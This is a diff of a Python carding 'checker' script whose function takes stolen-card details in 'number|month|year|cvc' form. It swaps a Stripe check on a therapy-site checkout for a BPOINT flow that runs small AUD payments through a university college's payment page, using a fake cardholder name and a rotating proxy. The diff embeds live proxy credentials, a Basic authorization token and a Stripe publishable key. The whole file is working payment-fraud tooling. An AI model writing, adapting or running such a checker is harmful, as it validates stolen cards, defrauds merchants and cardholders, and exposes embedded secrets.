@@ -1,5 +1,9 @@
 import requests,re
+from proxy import reqproxy, make_request
 def Tele(ccx):
+	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
+	session, ip = reqproxy(proxy_str)
+	#print(f"IP Address: {ip}")
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
 	mm = ccx.split("|")[1]
@@ -8,66 +12,139 @@ def Tele(ccx):
 	if "20" in yy:#Mo3gza
 		yy = yy.split("20")[1]
 	r = requests.session()
-	
+
 	headers = {
-	    'authority': 'api.stripe.com',
-	    'accept': 'application/json',
-	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'application/x-www-form-urlencoded',
-	    'origin': 'https://js.stripe.com',
-	    'referer': 'https://js.stripe.com/',
+	    'Accept': '*/*',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Authorization': 'Basic d2hpdGV0b3dlciBhcGl8NTM1MzEwOTQ5MDAwMzcwMDo3YUYxRkYwR2hmZFV1ZzlpWGkwVW1FNE5iZGhFdm4=',
+	    'Connection': 'keep-alive',
+	    'Content-Type': 'application/json',
+	    'Origin': 'https://www.stleos.uq.edu.au',
+	    'Referer': 'https://www.stleos.uq.edu.au/make-a-payment-bpoint/',
+	    'Sec-Fetch-Dest': 'empty',
+	    'Sec-Fetch-Mode': 'cors',
+	    'Sec-Fetch-Site': 'cross-site',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-site',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F0089f5e1e2%3B+stripe-js-v3%2F0089f5e1e2%3B+card-element&key=pk_live_JgsyXDLtr64E8XanodPoVtx5'
+	response = session.post('https://www.bpoint.com.au/rest/v5/txns/authkeys', headers=headers)
 	
-	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-	
-	pm = response.json()['id']
+	authkey = response.json()['authkey']
+	#print(authkey)
 	
 	headers = {
-	    'authority': 'www.therapywebgenie.com',
-	    'accept': '*/*',
-	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://www.therapywebgenie.com',
-	    'referer': 'https://www.therapywebgenie.com/checkout/',
+	    'Accept': '*/*',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Authorization': 'Basic d2hpdGV0b3dlciBhcGl8NTM1MzEwOTQ5MDAwMzcwMDo3YUYxRkYwR2hmZFV1ZzlpWGkwVW1FNE5iZGhFdm4=',
+	    'Connection': 'keep-alive',
+	    'Content-Type': 'application/json',
+	    'Origin': 'https://www.stleos.uq.edu.au',
+	    'Referer': 'https://www.stleos.uq.edu.au/make-a-payment-bpoint/',
+	    'Sec-Fetch-Dest': 'empty',
+	    'Sec-Fetch-Mode': 'cors',
+	    'Sec-Fetch-Site': 'cross-site',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
-	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
-	params = {
-	    't': '1749553395405',
+	json_data = {
+	    'action': 'Payment',
+	    'type': 'ECommerce',
+	    'subType': 'Single',
+	    'amount': 100,
+	    'billerCode': '1575604',
+	    'crn1': '1',
+	    'crn2': '',
+	    'crn3': '',
+	    'merchantReference': '',
+	    'currency': 'AUD',
+	    'bypass3ds': False,
+	    'tokenisationMode': 'Default',
+	    'emailAddress': '',
+	    'storeCard': False,
+	    'testMode': False,
 	}
 	
-	data = {
-	    'data': f'item_60__fluent_sf=&__fluent_form_embded_post_id=9848&_fluentform_60_fluentformnonce=a03f4db191&_wp_http_referer=%2Fcheckout%2F&input_text_2=Rodam%20User&input_text=&email=rodamuser08%40gmail.com&custom-payment-amount=0.50&description=Fund&input_text_1=www.strawhatchannel.com&payment_method=stripe&alt_s=&irvkua8880=785645&__stripe_payment_method_id={pm}',
-	    'action': 'fluentform_submit',
-	    'form_id': '60',
-	}
-	
-	response = requests.post(
-	    'https://www.therapywebgenie.com/wp-admin/admin-ajax.php',
-	    params=params,
+	response = session.put(
+	    f'https://www.bpoint.com.au/rest/v5/txns/authkeys/{authkey}/txn-details',
 	    headers=headers,
-	    data=data,
+	    json=json_data,
 	)
 	
-	try:
-		result = re.search(r'"errors":"Stripe Error: (.*?)"', response.text).group(1)
-	except:
-		result = response.text
+	headers = {
+	    'Accept': '*/*',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Connection': 'keep-alive',
+	    'Content-type': 'application/json',
+	    'Origin': 'https://www.stleos.uq.edu.au',
+	    'Referer': 'https://www.stleos.uq.edu.au/make-a-payment-bpoint/',
+	    'Sec-Fetch-Dest': 'empty',
+	    'Sec-Fetch-Mode': 'cors',
+	    'Sec-Fetch-Site': 'cross-site',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	}
+	
+	json_data = {
+	    'card': {
+	        'number': n,
+	        'expiry': {
+	            'month': f'{mm}',
+	            'year': yy,
+	        },
+	        'name': 'Dao Khao Saard',
+	        'cvn': f'{cvc}',
+	    },
+	}
+	
+	response = session.put(
+	    f'https://www.bpoint.com.au/rest/v5/txns/authkeys/{authkey}/client/payment-method',
+	    headers=headers,
+	    json=json_data,
+	)
+	
+	headers = {
+	    'Accept': '*/*',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Authorization': 'Basic d2hpdGV0b3dlciBhcGl8NTM1MzEwOTQ5MDAwMzcwMDo3YUYxRkYwR2hmZFV1ZzlpWGkwVW1FNE5iZGhFdm4=',
+	    'Connection': 'keep-alive',
+	    'Content-Type': 'application/json',
+	    'Origin': 'https://www.stleos.uq.edu.au',
+	    'Referer': 'https://www.stleos.uq.edu.au/make-a-payment-bpoint/',
+	    'Sec-Fetch-Dest': 'empty',
+	    'Sec-Fetch-Mode': 'cors',
+	    'Sec-Fetch-Site': 'cross-site',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	}
+	
+	json_data = {
+	    'webhook': {
+	        'url': 'https://stleo.wtdevsite.com/make-a-payment-bpoint/',
+	        'version': '5',
+	    },
+	    'surcharge': {
+	        'calculate': False,
+	        'amount': 0,
+	    },
+	    'updateToken': True,
+	}
+	
+	response = session.post(
+	    f'https://www.bpoint.com.au/rest/v5/txns/authkeys/{authkey}/process',
+	    headers=headers,
+	    json=json_data,
+	)
+	
+	result = re.search('"responseText":"(.*?)"', response.text).group(1)
 	
 	return (result)
